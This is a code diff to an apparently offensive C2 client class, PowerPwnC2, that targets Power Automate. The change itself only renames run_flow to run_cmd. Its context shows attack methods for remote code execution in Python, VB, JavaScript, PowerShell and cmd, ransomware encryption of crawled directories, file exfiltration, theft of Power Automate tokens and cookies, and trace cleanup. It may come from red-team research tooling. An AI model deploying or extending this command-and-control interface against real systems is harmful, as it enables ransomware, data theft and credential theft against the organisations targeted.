@@ -13,7 +13,7 @@ class PowerPwnC2:
         self.post_url = post_url
         self.debug = debug
 
-    def run_flow(self, arguments: CommandArguments) -> CommandResults:
+    def run_cmd(self, arguments: CommandArguments) -> CommandResults:
         try:
             flow_args = json.loads(arguments.json())
         except json.JSONDecodeError:
@@ -41,7 +41,7 @@ class PowerPwnC2:
         flow_args = CommandArguments(
             command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.PYTHON, code_exec_command=command
         )
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def exec_vb(self, command: str) -> CommandResults:
         """
@@ -52,7 +52,7 @@ class PowerPwnC2:
         flow_args = CommandArguments(
             command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.VISUALBASIC, code_exec_command=command
         )
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def exec_js(self, command: str) -> CommandResults:
         """
@@ -63,7 +63,7 @@ class PowerPwnC2:
         flow_args = CommandArguments(
             command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.JAVASCRIPT, code_exec_command=command
         )
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def exec_ps(self, command: str) -> CommandResults:
         """
@@ -74,7 +74,7 @@ class PowerPwnC2:
         flow_args = CommandArguments(
             command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.POWERSHELL, code_exec_command=command
         )
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def exec_cmd(self, command: str) -> CommandResults:
         """
@@ -85,7 +85,7 @@ class PowerPwnC2:
         flow_args = CommandArguments(
             command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.COMMANDLINE, code_exec_command=command
         )
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> CommandResults:
         """
@@ -102,7 +102,7 @@ class PowerPwnC2:
             ransomware_directories_to_init_crawl=dirs_to_init_crawl_str,
             ransomware_encryption_key=encryption_key,
         )
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def exfiltrate(self, target_file_path: str) -> CommandResults:
         """
@@ -111,7 +111,7 @@ class PowerPwnC2:
         :return: command results
         """
         flow_args = CommandArguments(command_to_run=CommandToRunEnum.EXFILTRATION, exfiltrate_target_file=target_file_path)
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def cleanup(self) -> CommandResults:
         """
@@ -119,7 +119,7 @@ class PowerPwnC2:
         :return: command results
         """
         flow_args = CommandArguments(command_to_run=CommandToRunEnum.CLEANUP)
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def steal_power_automate_token(self) -> CommandResults:
         """
@@ -127,7 +127,7 @@ class PowerPwnC2:
         :return: command results
         """
         flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN)
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
 
     def steal_cookie(self, fqdn: str) -> CommandResults:
         """
@@ -136,4 +136,4 @@ class PowerPwnC2:
         :return: command results
         """
         flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_COOKIE, steal_cookie_fqdn=fqdn)
-        return self.run_flow(flow_args)
+        return self.run_cmd(flow_args)
